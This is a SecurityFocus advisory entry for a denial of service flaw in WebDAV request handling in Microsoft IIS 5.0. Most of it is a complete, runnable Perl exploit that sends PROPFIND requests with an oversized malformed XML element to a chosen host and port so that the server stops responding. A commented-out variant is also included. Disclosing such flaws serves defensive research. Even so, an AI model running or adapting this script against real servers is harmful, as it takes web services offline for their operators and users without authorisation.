source: http://www.securityfocus.com/bid/2453/info

Microsoft IIS is subject to a denial of service condition. WebDAV contains a flaw in the handling of certain malformed requests, submitting multiple malformed WebDAV requests could cause the server to stop responding. This vulnerability is also known to restart all IIS services. 

#!/usr/bin/perl 
# Written by Georgi Guninski 
use IO::Socket; 

print "IIS 5.0 propfind\n"; 

$port = @ARGV[1]; 
$host = @ARGV[0]; 
  

sub vv() 
{ 

$ll=$_[0]; #length of buffer 
$ch=$_[1]; 
$over=$ch x $ll; #string to overflow 

$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => "TCP") || return; 
#$xml='<?xml version="1.0"?><a:propfind xmlns:a="DAV:" xmlns:u="'."$over".':"><a:prop><a:displayname />'."<u:$over />".'</a:prop></a:propfind>'."\n\n"; 
# ^^^^ This is another issue and also works with length ~>65000 
  

$xml='<?xml version="1.0"?><a:propfind xmlns:a="DAV:" xmlns:u="'."over".':"><a:prop><a:displayname />'."<u:$over />".'</a:prop></a:propfind>'."\n\n"; 
$l=length($xml); 
$req="PROPFIND / HTTP/1.1\nContent-type: text/xml\nHost: $host\nContent-length: $l\n\n$xml\n\n"; 
syswrite($socket,$req,length($req)); 
print "."; 
$socket->read($res,300); 
#print "r=".$res; 
close $socket; 
} 
  

do vv(128008,"V"); # may need to change the length 
sleep(1); 
do vv(128008,"V"); 
print "Done.\n";